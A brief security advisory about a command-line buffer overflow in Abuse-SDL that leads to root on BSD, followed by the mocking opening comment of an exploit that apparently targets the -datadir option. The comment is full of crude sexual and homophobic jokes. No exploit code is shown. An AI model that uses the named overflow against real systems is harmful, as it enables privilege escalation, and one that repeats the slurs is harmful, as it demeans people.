A buffer overflow vulnerability has been reported for Abuse-SDL that may result in the execution of attacker-supplied code. The vulnerability exists due to insufficient bounds checking performed on certain command-line options.

/*
	hey all.. this is a l33t 0x36 0day exploit by Matrix_DK :)
	This should give root, i give root to by the way,
	on all BSD systems with abuse installed.

	hi hi owned by root group wheel.. this is a hacker goodie

	I hoped abuse was my favorite game assabuse portet to unix..
	so i tried to load pics of my boyfriend johnlw ass into the game
	using -datadir... but the program died???

	could this be exploitet???

	i tried to exploit this myself, but i have no skillz. So i
	asked the other gays from 0x36, but there did not know how
	to do this hardcore command line overflows.
	I asked inv, but he told me to go ass fuck casto... inv is l33t
	he knows many exploit tricks.. he is my hero..

	So i had to steal some code from
	'smashing the stack for fun and profit' to get it to work...
	but now i have become a hacker i am going to send out many
	advisories so other people know im a hacker.. and one day maybe if
	i am lucky i can send out some exploits to.. but i have to get some
	unix, debug and code skillz first...

	i have made the shellcode myself.. look how l33t it is, it prints
	'what is the matrix ?' :).. that is cool.. us real hackers love the
	matrix, we jerk off to trinity in slow motion, and use nicks from
	the movie.
